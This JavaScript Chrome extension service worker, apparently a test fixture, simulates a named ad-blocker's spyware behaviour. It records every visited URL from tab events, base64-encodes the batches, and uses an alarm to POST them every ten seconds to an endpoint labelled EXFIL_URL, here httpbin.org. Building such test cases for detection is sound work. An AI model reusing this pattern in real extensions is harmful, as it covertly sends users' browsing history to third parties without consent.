// Simulates: Adblock Ad Blocker Pro (dgjbaljgolmlcmmklmmeafecikidmjpi)
// Pattern: SW fetches remote config on startup, then periodically sends
// collected browsing data. Uses chrome.alarms for persistence.

const CONFIG_URL = 'https://httpbin.org/get';
const EXFIL_URL = 'https://httpbin.org/post';

// Collected URLs buffer (like safeSearch in Adblock Ad Blocker Pro)
const collectedUrls = [];

// Step 1: Fetch remote config on startup
fetch(CONFIG_URL).then(r => r.json()).then(config => {
  console.log('[TEST] Config fetched successfully');
  chrome.storage.local.set({ configFetched: true, config });
}).catch(err => {
  console.log('[TEST] Config fetch failed (expected in test)', err.message);
});

// Step 2: Collect URLs from tab events
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status !== 'complete' || !tab.url) return;
  if (tab.url.startsWith('chrome')) return;
  collectedUrls.push({ url: tab.url, ts: Date.now() });
});

// Step 3: Periodic exfiltration via alarm (every 10 seconds)
chrome.alarms.create('exfil', { periodInMinutes: 0.167 }); // ~10 seconds

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name !== 'exfil') return;
  if (collectedUrls.length === 0) return;

  const batch = collectedUrls.splice(0); // drain buffer
  // Simulate AES-GCM encryption (just base64 in test)
  const encoded = btoa(JSON.stringify({ data: batch }));

  fetch(EXFIL_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ data: encoded }),
  }).then(() => {
    console.log('[TEST] Exfil batch sent', batch.length, 'URLs');
  }).catch(() => {});
});

// Keep-alive
setInterval(() => {}, 25000);
console.log('[TEST] Delayed fetch SW started');
